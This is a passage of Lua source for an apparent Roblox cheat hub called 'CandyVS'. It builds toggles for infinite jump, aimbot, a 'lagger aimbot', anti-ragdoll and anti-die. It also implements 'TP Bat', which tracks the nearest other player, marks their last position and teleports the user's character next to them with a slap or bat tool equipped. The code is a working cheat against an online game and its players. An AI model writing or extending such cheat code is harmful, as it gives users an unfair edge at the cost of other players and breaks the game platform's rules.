	vBtn.Position = UDim2.new(1, -120, 0.5, -10)
	local pill = getBindPill()
	if pill then pill.Visible = true end
	end

	if carrySpeedMode == "v2" then applyV2Mode() else applyV1Mode() end
	attachCleanHubTap(vBtn, function()
	if carrySpeedMode == "v1" then
	applyV2Mode()
	else
	applyV1Mode()
	end
	saveConfig()
	end)
	end
	end
	pcall(function()
	if _G and _G.__setNoPlayerCollision then _G.__setNoPlayerCollision(true) end
	end)
	local function styleSmallToggle(row)
	if not row then return end
	pcall(function()
	row.Size = UDim2.new(1, -2, 0, GUI_METRICS.compactCardH)
	for _, c in ipairs(row:GetChildren()) do
	if c:IsA("TextButton") then
	c.Size = UDim2.new(1, 0, 0, GUI_METRICS.compactCardH)
	c.BackgroundColor3 = Color3.fromRGB(25,31,42)
	c.BackgroundTransparency = 0.35
	c.BorderSizePixel = 0
	c.ZIndex = 21
	local corner = c:FindFirstChildOfClass("UICorner")
	if corner then corner.CornerRadius = UDim.new(0,5) else Instance.new("UICorner", c).CornerRadius = UDim.new(0,5) end
	local stroke = c:FindFirstChildOfClass("UIStroke")
	if stroke then stroke.Color = Color3.fromRGB(0,0,0); stroke.Thickness = 1; stroke.Transparency = 0 end
	break
	end
	end
	end)
	end
	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["Autoplay"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)
	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["Carry Speed"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)
	pcall(function()
	local m = _featureToggleMap and _featureToggleMap["TP Bat"]
	if m and m.card and m.card.Parent then styleSmallToggle(m.card.Parent) end
	end)

	_G.__CandyVSInfJumpMode = _G.__CandyVSInfJumpMode or "hold"
	makeToggleNoKeybind(movementSection, "Unwalk", "Unwalk")
	local infJumpToggleRow = makeToggleNoKeybind(movementSection, "Inf Jump", "Inf Jump")
	if infJumpToggleRow then
	local infJumpModeBtn = Instance.new("TextButton", infJumpToggleRow)
	infJumpModeBtn.Name = "InfJumpModeBtn"
	infJumpModeBtn.Size = UDim2.new(0, 66, 0, 20)
	infJumpModeBtn.Position = UDim2.new(1, -74, 0.5, -10)
	infJumpModeBtn.AnchorPoint = Vector2.new(0, 0)
	infJumpModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	infJumpModeBtn.BorderSizePixel = 0
	infJumpModeBtn.Text = (_G.__CandyVSInfJumpMode == "hold") and "HOLD" or "MANUAL"
	infJumpModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	infJumpModeBtn.Font = Enum.Font.FredokaOne
	infJumpModeBtn.TextSize = 10
	infJumpModeBtn.AutoButtonColor = false
	infJumpModeBtn.ZIndex = 30
	Instance.new("UICorner", infJumpModeBtn).CornerRadius = UDim.new(0, 4)
	local infJumpModeStroke = Instance.new("UIStroke", infJumpModeBtn)
	infJumpModeStroke.Color = Color3.fromRGB(255,255,255)
	infJumpModeStroke.Thickness = 1
	infJumpModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function updateInfJumpModeButton()
	local isHold = (_G.__CandyVSInfJumpMode == "hold")
	infJumpModeBtn.Text = isHold and "HOLD" or "MANUAL"
	infJumpModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	infJumpModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	infJumpModeStroke.Color = Color3.fromRGB(255,255,255)
	infJumpModeStroke.Thickness = 1
	infJumpModeBtn.TextStrokeTransparency = 1
	end
	updateInfJumpModeButton()
	connectBtn(infJumpModeBtn, function()
	_G.__CandyVSInfJumpMode = (_G.__CandyVSInfJumpMode == "hold") and "manual" or "hold"
	updateInfJumpModeButton()
	if toggleStates["Inf Jump"] then
	if _G.__CandyVSInfJumpMode == "hold" then
	startInfJump()
	else
	stopInfJump()
	end
	end
	end)
	end
	local tpDownRow = makeToggle(movementSection, "TP Down", "TP Down")
	pcall(function() styleSmallToggle(tpDownRow) end)
	makeToggleWithInput(movementSection, "Auto TP Down", "Auto TP Down", "AutoTPDownHeight",
	function(value) return tostring(math.floor((tonumber(value) or 20) + 0.5)) end,
	function(value) return math.clamp(math.floor((tonumber(value) or 20) + 0.5), 1, 1000) end)

	local combatSection = makeUraniumSection(tabPages.Combat, "COMBAT")
	makeToggle(combatSection, "Anti Bat", "Anti Bat")
	makeToggleNoKeybind(combatSection, "Anti Ragdoll", "Anti Ragdoll")
	makeToggleNoKeybind(combatSection, "Ragdoll Counter", "Ragdoll Counter")
	makeToggleNoKeybind(combatSection, "Medusa Counter", "Medusa Counter")

	_G.__CandyVSAntiDieGuiEnabled = function()
	return toggleStates["Anti Die"] == true
	end
	FeaturePostToggle["Anti Die"] = function(active)
	pcall(function() if _G.__CandyVSAntiDieSource then _G.__CandyVSAntiDieSource("toggle", active) end end)
	end
	makeToggleNoKeybind(combatSection, "Anti Die", "Anti Die")
	FeaturePostToggle["Anti Die"](toggleStates["Anti Die"] == true)

	do
	local aimbotRow = makeToggle(combatSection, "Aimbot", "Aimbot")
	pcall(function() styleSmallToggle(aimbotRow) end)
	end
	pcall(styleSmallToggle, makeToggle(combatSection, "Lagger Aimbot", "Lagger Aimbot"))

	do
if false then
local tpBatRow = makeToggle(combatSection, "TP Bat", "TP Bat", function(extension)
local container = extension.Parent
local card = container and container:FindFirstChildOfClass("TextButton")
if not card then return 28 end

local batVersionPill = Instance.new("TextButton", card)
batVersionPill.Name = "BatVersionToggle"
batVersionPill.Size = UDim2.new(0, 64, 0, 22)
batVersionPill.Position = UDim2.new(1, -118, 0.5, -11)
batVersionPill.BackgroundColor3 = Color3.fromRGB(30,30,38)
batVersionPill.BorderSizePixel = 0
batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1)
batVersionPill.TextColor3 = Color3.fromRGB(225,238,255)
batVersionPill.Font = Enum.Font.FredokaOne
batVersionPill.TextSize = 10
batVersionPill.AutoButtonColor = false
batVersionPill.Active = false
batVersionPill.Selectable = false
batVersionPill.Visible = false
batVersionPill.ZIndex = 30
Instance.new("UICorner", batVersionPill).CornerRadius = UDim.new(0, 4)
local bvStroke = Instance.new("UIStroke", batVersionPill)
bvStroke.Color = Color3.fromRGB(255,255,255)
bvStroke.Thickness = 1
bvStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local distanceConfigPill = Instance.new("TextButton", card)
distanceConfigPill.Name = "BatConfigToggle"
distanceConfigPill.Size = UDim2.new(0, isMobile and 50 or 64, 0, isMobile and 18 or 22)
distanceConfigPill.Position = UDim2.new(1, isMobile and -88 or -118, 0.5, isMobile and -9 or -11)
distanceConfigPill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
distanceConfigPill.BorderSizePixel = 0
distanceConfigPill.Text = ""
distanceConfigPill.AutoButtonColor = false
distanceConfigPill.ZIndex = 30
Instance.new("UICorner", distanceConfigPill).CornerRadius = UDim.new(0, 4)
local distanceToggleStroke = Instance.new("UIStroke", distanceConfigPill)
distanceToggleStroke.Color = Color3.fromRGB(160, 175, 195)
distanceToggleStroke.Thickness = 1
distanceToggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local configToggleLabel = Instance.new("TextLabel", distanceConfigPill)
configToggleLabel.Size = UDim2.new(0, 30, 1, 0)
configToggleLabel.Position = UDim2.new(0, 5, 0, 0)
configToggleLabel.BackgroundTransparency = 1
configToggleLabel.Text = "GUI"
configToggleLabel.TextColor3 = Color3.fromRGB(235, 240, 250)
configToggleLabel.Font = Enum.Font.FredokaOne
configToggleLabel.TextSize = 8
configToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
configToggleLabel.ZIndex = 31

local configSwitchTrack = Instance.new("Frame", distanceConfigPill)
configSwitchTrack.Size = UDim2.new(0, 24, 0, 12)
configSwitchTrack.Position = UDim2.new(1, -29, 0.5, -6)
configSwitchTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 33)
configSwitchTrack.BorderSizePixel = 0
configSwitchTrack.ZIndex = 31
Instance.new("UICorner", configSwitchTrack).CornerRadius = UDim.new(1, 0)

local configSwitchKnob = Instance.new("Frame", configSwitchTrack)
configSwitchKnob.Size = UDim2.new(0, 8, 0, 8)
configSwitchKnob.Position = UDim2.new(0, 2, 0.5, -4)
configSwitchKnob.BackgroundColor3 = Color3.fromRGB(155, 165, 180)
configSwitchKnob.BorderSizePixel = 0
configSwitchKnob.ZIndex = 32
Instance.new("UICorner", configSwitchKnob).CornerRadius = UDim.new(1, 0)

local distancePanel = Instance.new("Frame", extension)
distancePanel.Name = "BatV2DistanceConfig"
distancePanel.Size = UDim2.new(1, -2, 0, 78)
distancePanel.Position = UDim2.new(0, 1, 0, 4)
distancePanel.BackgroundColor3 = Color3.fromRGB(25, 31, 42)
distancePanel.BackgroundTransparency = 0.2
distancePanel.BorderSizePixel = 0
distancePanel.ZIndex = 22
Instance.new("UICorner", distancePanel).CornerRadius = UDim.new(0, 6)
local distancePanelStroke = Instance.new("UIStroke", distancePanel)
distancePanelStroke.Color = Color3.fromRGB(90, 130, 185)
distancePanelStroke.Transparency = 0.25
distancePanelStroke.Thickness = 1

local distanceLabel = Instance.new("TextLabel", distancePanel)
distanceLabel.Size = UDim2.new(1, -92, 0, 38)
distanceLabel.Position = UDim2.new(0, 10, 0, 0)
distanceLabel.BackgroundTransparency = 1
distanceLabel.Text = "DISTANCIA TP (STUDS)"
distanceLabel.TextColor3 = Color3.fromRGB(190, 210, 238)
distanceLabel.Font = Enum.Font.FredokaOne
distanceLabel.TextSize = 10
distanceLabel.TextXAlignment = Enum.TextXAlignment.Left
distanceLabel.ZIndex = 23

local distanceInput = Instance.new("TextBox", distancePanel)
distanceInput.Name = "BatV2DistanceInput"
distanceInput.Size = UDim2.new(0, 70, 0, 26)
distanceInput.Position = UDim2.new(1, -80, 0, 6)
distanceInput.BackgroundColor3 = Color3.fromRGB(15, 20, 29)
distanceInput.BackgroundTransparency = 0.05
distanceInput.BorderSizePixel = 0
distanceInput.ClearTextOnFocus = false
distanceInput.Text = tostring(_G.__tpBatV2Distance or 8)
distanceInput.TextColor3 = Color3.fromRGB(245, 248, 255)
distanceInput.Font = Enum.Font.FredokaOne
distanceInput.TextSize = 11
distanceInput.TextXAlignment = Enum.TextXAlignment.Center
distanceInput.ZIndex = 24
Instance.new("UICorner", distanceInput).CornerRadius = UDim.new(0, 4)
local distanceInputStroke = Instance.new("UIStroke", distanceInput)
distanceInputStroke.Color = Color3.fromRGB(125, 170, 225)
distanceInputStroke.Transparency = 0.2
distanceInputStroke.Thickness = 1
_G.__tpBatV2DistanceInput = distanceInput

local versionInsideLabel = Instance.new("TextLabel", distancePanel)
versionInsideLabel.Size = UDim2.new(1, -92, 0, 34)
versionInsideLabel.Position = UDim2.new(0, 10, 0, 40)
versionInsideLabel.BackgroundTransparency = 1
versionInsideLabel.Text = "VERSION TP BAT"
versionInsideLabel.TextColor3 = Color3.fromRGB(190, 210, 238)
versionInsideLabel.Font = Enum.Font.FredokaOne
versionInsideLabel.TextSize = 10
versionInsideLabel.TextXAlignment = Enum.TextXAlignment.Left
versionInsideLabel.ZIndex = 23
versionInsideLabel.Visible = true

local versionInsidePill = Instance.new("TextButton", distancePanel)
versionInsidePill.Name = "BatVersionInsideConfig"
versionInsidePill.Size = UDim2.new(0, 70, 0, 26)
versionInsidePill.Position = UDim2.new(1, -80, 0, 44)
versionInsidePill.BackgroundColor3 = Color3.fromRGB(28, 92, 165)
versionInsidePill.BorderSizePixel = 0
versionInsidePill.Text = "V" .. tostring(_G.__batVersion or 1)
versionInsidePill.TextColor3 = Color3.fromRGB(245, 248, 255)
versionInsidePill.Font = Enum.Font.FredokaOne
versionInsidePill.TextSize = 11
versionInsidePill.AutoButtonColor = false
versionInsidePill.Active = true
versionInsidePill.Visible = true
versionInsidePill.ZIndex = 24
Instance.new("UICorner", versionInsidePill).CornerRadius = UDim.new(0, 4)
local versionInsideStroke = Instance.new("UIStroke", versionInsidePill)
versionInsideStroke.Color = Color3.fromRGB(110, 190, 255)
versionInsideStroke.Transparency = 0.15
versionInsideStroke.Thickness = 1

local distanceConfigOpen = false
local function updateDistanceConfigVisibility()
local visible = distanceConfigOpen
distanceConfigPill.Visible = true
distanceConfigPill.BackgroundColor3 = visible and Color3.fromRGB(28, 92, 165) or Color3.fromRGB(45, 48, 58)
distanceToggleStroke.Color = visible and Color3.fromRGB(110, 190, 255) or Color3.fromRGB(160, 175, 195)
configSwitchTrack.BackgroundColor3 = visible and Color3.fromRGB(45, 135, 225) or Color3.fromRGB(25, 27, 33)
configSwitchKnob.BackgroundColor3 = visible and Color3.fromRGB(245, 248, 255) or Color3.fromRGB(155, 165, 180)
configSwitchKnob.Position = visible and UDim2.new(1, -10, 0.5, -4) or UDim2.new(0, 2, 0.5, -4)
extension.Visible = visible
extension.Size = UDim2.new(1, 0, 0, visible and 86 or 0)
container.Size = UDim2.new(1, -2, 0, visible and (GUI_METRICS.toggleH + 86) or GUI_METRICS.toggleH)
end

connectBtn(distanceConfigPill, function()
distanceConfigOpen = not distanceConfigOpen
updateDistanceConfigVisibility()
end)

distanceInput.FocusLost:Connect(function()
_G.CandyVSAutoBat.SetV2Distance(distanceInput.Text)
end)

_G.__batVersionPill = batVersionPill
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
local function updateBatVersionButton()
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1)
batVersionPill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
batVersionPill.TextColor3 = Color3.fromRGB(245, 248, 255)
bvStroke.Color = Color3.fromRGB(220, 225, 235)
versionInsidePill.Text = "V" .. tostring(_G.__batVersion or 1)
versionInsidePill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
versionInsideStroke.Color = Color3.fromRGB(220, 225, 235)
distanceInput.TextEditable = true
distanceInput.Text = tostring(_G.__tpBatV2Distance or 8)
distanceInput.BackgroundTransparency = 0.05
distanceInput.TextColor3 = Color3.fromRGB(245, 248, 255)
updateDistanceConfigVisibility()
end
_G.__CandyVSUpdateBatVersionButton = updateBatVersionButton
updateBatVersionButton()

connectBtn(batVersionPill, function()
_G.CandyVSAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
end)

connectBtn(versionInsidePill, function()
_G.CandyVSAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
end)

extension.Size = UDim2.new(1, 0, 0, 0)
extension.Visible = false
container.Size = UDim2.new(1, -2, 0, GUI_METRICS.toggleH)
task.defer(updateDistanceConfigVisibility)
return 0
end)
pcall(function() styleSmallToggle(tpBatRow) end)
	end
end
;(function()
pcall(function()
local oldMarker = workspace:FindFirstChild("CandyVSTPBatLastPosition")
if oldMarker then oldMarker:Destroy() end
end)
local tpBatState = {
enabled = false,
heartbeat = nil,
target = nil,
samples = {},
swingLocked = false,
nextSwingAt = 0,
lastSafeCFrame = nil,
lastPosition = nil,
lastSampleTime = 0,
recoverUntil = 0,
physicsPauseUntil = 0,
previousAutoRotate = nil,
lastTargetMarker = nil,
markerLocked = false,
markerTarget = nil,
markerBodyLock = nil,
markerBodyAttachment = nil,
}
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
local getRig = (function()
local character = Player.Character
if not character then return nil, nil, nil end
return character, character:FindFirstChild("HumanoidRootPart"), character:FindFirstChildOfClass("Humanoid")
end)

local finiteVector = (function(vector)
return vector ~= nil
and vector.X == vector.X and vector.Y == vector.Y and vector.Z == vector.Z
and math.abs(vector.X) < 10000000
and math.abs(vector.Y) < 10000000
and math.abs(vector.Z) < 10000000
end)

local facingCFrame = (function(position, lookTargetPos, fallbackLook, keepCF)
local flat = Vector3.new(lookTargetPos.X - position.X, 0, lookTargetPos.Z - position.Z)
if flat.Magnitude > 0.05 then
return CFrame.lookAt(position, position + flat.Unit)
end
local flatFallback = fallbackLook and Vector3.new(fallbackLook.X, 0, fallbackLook.Z) or nil
if flatFallback and flatFallback.Magnitude >= 0.01 then
return CFrame.lookAt(position, position + flatFallback.Unit)
end
if keepCF then
local _, yaw = keepCF:ToEulerAnglesYXZ()
return CFrame.new(position) * CFrame.Angles(0, yaw, 0)
end
return CFrame.new(position)
end)

local TP_BAT_MARKER_DISTANCE = 3

local markerEngagementCFrame = (function(root, marker)
if not root or not marker then return nil end
local markerPosition = marker.Position
local away = Vector3.new(
root.Position.X - markerPosition.X,
0,
root.Position.Z - markerPosition.Z
)
if away.Magnitude <= 0.05 then
local look = marker.CFrame.LookVector
away = Vector3.new(-look.X, 0, -look.Z)
end
if away.Magnitude <= 0.05 then away = Vector3.new(0, 0, 1) end
local teleportPosition = markerPosition + away.Unit * TP_BAT_MARKER_DISTANCE
return facingCFrame(teleportPosition, markerPosition, marker.CFrame.LookVector, root.CFrame)
end)

local clearMarkerBodyLock = (function()
if tpBatState.markerBodyLock then
pcall(function() tpBatState.markerBodyLock:Destroy() end)
tpBatState.markerBodyLock = nil
end
if tpBatState.markerBodyAttachment then
pcall(function() tpBatState.markerBodyAttachment:Destroy() end)
tpBatState.markerBodyAttachment = nil
end
end)

local applyMarkerBodyLock = (function(root, marker)
clearMarkerBodyLock()
end)

_G.__CandyVSTPBatApplyMarkerBodyLock = applyMarkerBodyLock
_G.__CandyVSTPBatClearMarkerBodyLock = clearMarkerBodyLock

local safeTeleport = (function(root, targetCFrame)
	if not root or not targetCFrame then return false end
	local marker = tpBatState and tpBatState.lastTargetMarker
	if marker and marker.Parent and marker.Transparency and marker.Transparency < 1 then
		return false
	end
	local ok = pcall(function()
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
		root.CFrame = targetCFrame
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
	end)
	return ok
end)

local TP_BAT_MIN_X, TP_BAT_MAX_X = -536.2, -422
local TP_BAT_MIN_Y, TP_BAT_MAX_Y = -10, 75
local TP_BAT_MIN_Z, TP_BAT_MAX_Z = -71.8, 192.9
local TP_BAT_MARKER_GROUND_Y = -7
local TP_BAT_MARKER_LOOKBACK = 0.2

local isInsideAllowedArea = (function(position)
if not position then return false end
return position.X >= TP_BAT_MIN_X and position.X <= TP_BAT_MAX_X
and position.Y >= TP_BAT_MIN_Y and position.Y <= TP_BAT_MAX_Y
and position.Z >= TP_BAT_MIN_Z and position.Z <= TP_BAT_MAX_Z
end)

_G.__CandyVSTPBatIsInsideMap = isInsideAllowedArea

local updateLastTargetMarker = (function(targetCFrame)
if tpBatState.markerLocked then return end
	local tracked = tpBatState.markerTarget
	local character = tracked and tracked.Parent == Players and tracked.Character
	local targetRoot = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not targetRoot or not humanoid or humanoid.Health <= 0
	or not finiteVector(targetRoot.Position) or isInsideAllowedArea(targetRoot.Position) then return end
if not targetCFrame or not isInsideAllowedArea(targetCFrame.Position) then return end
local groundMarkerCFrame = CFrame.new(
targetCFrame.Position.X,
TP_BAT_MARKER_GROUND_Y,
targetCFrame.Position.Z
) * targetCFrame.Rotation
local marker = tpBatState.lastTargetMarker
if not marker or not marker.Parent then
marker = Instance.new("Part")
marker.Name = "CandyVSTPBatLastPosition"
marker.Shape = Enum.PartType.Ball
marker.Size = Vector3.new(3, 3, 3)
marker.Color = Color3.fromRGB(0, 110, 255)
marker.Material = Enum.Material.Neon
marker.Anchored = true
marker.CanCollide = false
marker.CanTouch = false
marker.CanQuery = false
marker.CastShadow = false
marker.Parent = workspace

local overlaySphere = Instance.new("SphereHandleAdornment")
overlaySphere.Name = "AlwaysOnTopSphere"
overlaySphere.Adornee = marker
overlaySphere.Radius = 1.55
overlaySphere.Color3 = Color3.fromRGB(0, 125, 255)
overlaySphere.Transparency = 0.05
overlaySphere.AlwaysOnTop = true
overlaySphere.Visible = true
overlaySphere.ZIndex = 10
overlaySphere.Parent = marker

local highlight = Instance.new("Highlight")
highlight.Name = "LastPositionHighlight"
highlight.Adornee = marker
highlight.FillColor = Color3.fromRGB(0, 110, 255)
highlight.FillTransparency = 0.15
highlight.OutlineColor = Color3.fromRGB(120, 200, 255)
highlight.OutlineTransparency = 0
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.Enabled = true
highlight.Parent = marker

local billboard = Instance.new("BillboardGui")
billboard.Name = "LastPositionLabel"
billboard.Size = UDim2.new(0, 110, 0, 20)
billboard.StudsOffset = Vector3.new(0, 2.1, 0)
billboard.AlwaysOnTop = true
billboard.Adornee = marker
billboard.Parent = marker

local label = Instance.new("TextLabel")
label.Name = "Text"
label.Size = UDim2.fromScale(1, 1)
label.BackgroundTransparency = 1
label.Text = "ultima posicion"
label.TextColor3 = Color3.fromRGB(220, 235, 255)
label.TextStrokeColor3 = Color3.fromRGB(0, 35, 90)
label.TextStrokeTransparency = 0.25
label.TextSize = 11
label.Font = Enum.Font.FredokaOne
label.Parent = billboard

tpBatState.lastTargetMarker = marker
end
marker.Transparency = 0
local overlaySphere = marker:FindFirstChild("AlwaysOnTopSphere")
if overlaySphere then overlaySphere.Visible = true end
local highlight = marker:FindFirstChild("LastPositionHighlight")
if highlight then highlight.Enabled = true end
local billboard = marker:FindFirstChild("LastPositionLabel")
if billboard then billboard.Enabled = true end
marker.CFrame = groundMarkerCFrame
tpBatState.markerLocked = true
end)

local clearLastTargetMarker = (function()
tpBatState.markerLocked = false
clearMarkerBodyLock()
if tpBatState.lastTargetMarker then
pcall(function()
tpBatState.lastTargetMarker.Transparency = 1
local overlaySphere = tpBatState.lastTargetMarker:FindFirstChild("AlwaysOnTopSphere")
if overlaySphere then overlaySphere.Visible = false end
local highlight = tpBatState.lastTargetMarker:FindFirstChild("LastPositionHighlight")
if highlight then highlight.Enabled = false end
local billboard = tpBatState.lastTargetMarker:FindFirstChild("LastPositionLabel")
if billboard then billboard.Enabled = false end
end)
end
end)

_G.__CandyVSTPBatGetMarkerCFrame = function()
local marker = tpBatState.lastTargetMarker
if tpBatState.markerLocked and marker and marker.Parent and marker.Transparency < 1 then
local tracked = tpBatState.markerTarget
local trackedRoot = tracked and tracked.Character and tracked.Character:FindFirstChild("HumanoidRootPart")
if trackedRoot and isInsideAllowedArea(trackedRoot.Position) then
clearLastTargetMarker()
return nil
end
local _, root = getRig()
return markerEngagementCFrame(root, marker) or marker.CFrame
end
return nil
end

_G.__CandyVSTPBatTrackTarget = function(player)
if tpBatState.markerLocked then return tpBatState.markerTarget end
local current = tpBatState.markerTarget
local currentCharacter = current and current.Parent == Players and current.Character
local currentHumanoid = currentCharacter and currentCharacter:FindFirstChildOfClass("Humanoid")
local currentRoot = currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart")
local currentSample = current and tpBatState.samples[current]
if current and current.Parent == Players then
if currentHumanoid and currentHumanoid.Health > 0
and ((currentRoot and isInsideAllowedArea(currentRoot.Position))
or (currentSample and currentSample.safeCFrame)) then return current end
if not currentHumanoid and currentSample and currentSample.safeCFrame then return current end
end
if player and player ~= Player and player.Parent == Players then
tpBatState.markerTarget = player
return player
end
return tpBatState.markerTarget
end

_G.__CandyVSTPBatClearMarkerTracking = function()
tpBatState.target = nil
end

local targetAlive = (function(player, myRoot)
if not player or player.Parent ~= Players or not player.Character then return false end
local root = player.Character:FindFirstChild("HumanoidRootPart")
local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
if not root or not humanoid or humanoid.Health <= 0 or not isInsideAllowedArea(root.Position) then
return false
end
return true
end)

local getSnapshotBeforeExit = (function(sample, now)
if not sample or not sample.history or #sample.history == 0 then return nil end
local cutoff = now - TP_BAT_MARKER_LOOKBACK
local selected = nil
for _, entry in ipairs(sample.history) do
if entry.time <= cutoff then
selected = entry
else
break
end
end
return selected or sample.history[1]
end)

_G.__CandyVSTPBatForceMarker = function(player, fallbackCFrame)
if player and player.Parent == Players then
tpBatState.markerTarget = player
end
local sample = player and tpBatState.samples[player]
local snapshot = getSnapshotBeforeExit(sample, tick())
local remembered = snapshot and snapshot.safeCFrame or (sample and sample.safeCFrame)
if not remembered and fallbackCFrame and isInsideAllowedArea(fallbackCFrame.Position) then
remembered = fallbackCFrame
end
if remembered then updateLastTargetMarker(remembered) end
return _G.__CandyVSTPBatGetMarkerCFrame()
end

local monitorLastTarget = (function()
local _, myRoot = getRig()
if not myRoot then return end

local tracked = tpBatState.markerTarget
	if tracked and tracked.Parent == Players then
local targetRoot = tracked.Character and tracked.Character:FindFirstChild("HumanoidRootPart")
local targetHumanoid = tracked.Character and tracked.Character:FindFirstChildOfClass("Humanoid")
local sample = tpBatState.samples[tracked] or {}
tpBatState.samples[tracked] = sample

if targetRoot and targetHumanoid and targetHumanoid.Health > 0 and finiteVector(targetRoot.Position) then
if isInsideAllowedArea(targetRoot.Position) then
local now = tick()
if tpBatState.markerLocked then
sample.history = {}
end
sample.history = sample.history or {}
table.insert(sample.history, {
time = now,
safePosition = targetRoot.Position,
safeCFrame = targetRoot.CFrame,
})
while sample.history[1] and now - sample.history[1].time > (TP_BAT_MARKER_LOOKBACK + 0.25) do
table.remove(sample.history, 1)
end
sample.safePosition = targetRoot.Position
sample.safeCFrame = targetRoot.CFrame
clearLastTargetMarker()
else
local snapshot = getSnapshotBeforeExit(sample, tick())
updateLastTargetMarker((snapshot and snapshot.safeCFrame) or sample.safeCFrame)
end
end
		if (targetHumanoid and targetHumanoid.Health <= 0)
		or (not targetRoot and not sample.safeCFrame) then
		tpBatState.markerTarget = nil
		clearLastTargetMarker()
		else
		return
		end
end

local closest, closestDistanceSq = nil, math.huge
for _, player in ipairs(Players:GetPlayers()) do
if player ~= Player and targetAlive(player) then
local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
local delta = targetRoot.Position - myRoot.Position
local distanceSq = delta:Dot(delta)
if distanceSq < closestDistanceSq then
closest = player
closestDistanceSq = distanceSq
end
end
end

if closest then
tpBatState.markerTarget = closest
local targetRoot = closest.Character:FindFirstChild("HumanoidRootPart")
local sample = tpBatState.samples[closest] or {}
tpBatState.samples[closest] = sample
sample.safePosition = targetRoot.Position
sample.safeCFrame = targetRoot.CFrame
sample.history = {
{ time = tick(), safePosition = targetRoot.Position, safeCFrame = targetRoot.CFrame }
}
end
end)

local markerMonitorAccumulator = 0
local TP_BAT_MARKER_INTERVAL = 1 / 60
local markerMonitor = RunService.Heartbeat:Connect((function(dt)
markerMonitorAccumulator = markerMonitorAccumulator + (dt or 0)
if markerMonitorAccumulator < TP_BAT_MARKER_INTERVAL then return end
markerMonitorAccumulator = markerMonitorAccumulator % TP_BAT_MARKER_INTERVAL
monitorLastTarget()
end))
_G.__CandyVSTrackConn(markerMonitor)

local function followPreservedMarker(root)
local markerCFrame = _G.__CandyVSTPBatGetMarkerCFrame()
if not markerCFrame then
clearMarkerBodyLock()
return false
end
pcall(function()
root.AssemblyLinearVelocity = Vector3.zero
root.AssemblyAngularVelocity = Vector3.zero
root.CFrame = markerCFrame
root.AssemblyLinearVelocity = Vector3.zero
root.AssemblyAngularVelocity = Vector3.zero
end)
local marker = tpBatState.lastTargetMarker
if marker then applyMarkerBodyLock(root, marker) end
return true
end
_G.__CandyVSTrackStopper(function() pcall(clearLastTargetMarker) end)

	do
	local tpBatState = {
	enabled = false,
	heartbeat = nil,
	target = nil,
	samples = {},
	swingLocked = false,
	nextSwingAt = 0,
	lastSafeCFrame = nil,
	lastPosition = nil,
	lastSampleTime = 0,
	recoverUntil = 0,
	physicsPauseUntil = 0,
	previousAutoRotate = nil,
	lastTargetMarker = nil,
	markerLocked = false,
	markerTarget = nil,
	}
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	local TP_BAT_RATE = 80
	local TP_BAT_COOLDOWN = 1 / TP_BAT_RATE

	local BAT_NAMES = {
	"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap",
	"Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap",
	"Nuclear Slap", "Galaxy Slap", "Glitched Slap",
	}

	local function getRig()
	local character = Player.Character
	if not character then return nil, nil, nil end
	return character, character:FindFirstChild("HumanoidRootPart"), character:FindFirstChildOfClass("Humanoid")
	end

	local function findBat(equip)
	local character, _, humanoid = getRig()
	if not character then return nil end

	for _, name in ipairs(BAT_NAMES) do
	local tool = character:FindFirstChild(name)
	if tool and tool:IsA("Tool") then return tool end
	end
	for _, child in ipairs(character:GetChildren()) do
	if child:IsA("Tool") then
	local name = child.Name:lower()
	if name:find("bat", 1, true) or name:find("slap", 1, true) then
	return child
	end
	end
	end

	local backpack = Player:FindFirstChildOfClass("Backpack")
	if backpack then
	local found = nil
	for _, name in ipairs(BAT_NAMES) do
	local tool = backpack:FindFirstChild(name)
	if tool and tool:IsA("Tool") then found = tool; break end
	end
	if not found then
	for _, child in ipairs(backpack:GetChildren()) do
	if child:IsA("Tool") then
	local name = child.Name:lower()
	if name:find("bat", 1, true) or name:find("slap", 1, true) then
	found = child
	break
	end
	end
	end
	end
	if found and equip and humanoid then
	pcall(function() humanoid:EquipTool(found) end)
	end
	return found
	end
	return nil
	end

	local function finiteVector(vector)
	return vector.X == vector.X and vector.Y == vector.Y and vector.Z == vector.Z
	and math.abs(vector.X) < 10000000
	and math.abs(vector.Y) < 10000000
	and math.abs(vector.Z) < 10000000
	end

	local function facingCFrame(position, lookTargetPos, fallbackLook, keepCF)
	local flat = Vector3.new(lookTargetPos.X - position.X, 0, lookTargetPos.Z - position.Z)
	if flat.Magnitude > 0.05 then
	return CFrame.lookAt(position, position + flat.Unit)
	end
	local flatFallback = fallbackLook and Vector3.new(fallbackLook.X, 0, fallbackLook.Z) or nil
